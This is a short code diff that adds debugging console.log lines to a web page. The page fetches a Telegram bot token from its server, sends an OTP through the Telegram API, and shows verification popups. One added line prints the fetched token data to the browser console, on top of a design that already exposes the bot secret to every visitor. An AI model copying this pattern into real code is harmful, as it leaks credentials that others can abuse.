@@ -108,6 +108,7 @@
         fetch('/get-token')
             .then(response => response.json())
             .then(data => {
+                console.log('Token data received:', data); // Debugging line
                 const botToken = data.TELEGRAM_BOT_TOKEN;
                 const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -145,7 +146,7 @@
                     })
                         .then(response => response.json())
                         .then(data => {
-                            console.log('OTP sent:', data);
+                            console.log('OTP sent:', data); // Debugging line
                             document.getElementById('popup-overlay').style.display = 'none';
                             document.getElementById('popup').style.display = 'none';
                             document.getElementById('otp-popup').style.display = 'block';
@@ -175,6 +176,7 @@
                 }
 
                 window.onload = function () {
+                    console.log('Page loaded'); // Debugging line
                     const otpVerified = localStorage.getItem('otpVerified');
 
                     if (!otpVerified || shouldShowPopup()) {
@@ -186,9 +188,13 @@
                 };
 
                 function showPopup() {
+                    console.log('Showing popup'); // Debugging line
                     document.getElementById('popup-overlay').style.display = 'block';
                     document.getElementById('popup').style.display = 'block';
                 }
+            })
+            .catch(error => {
+                console.error('Error fetching token:', error); // Debugging line
             });
     </script>
 </body>
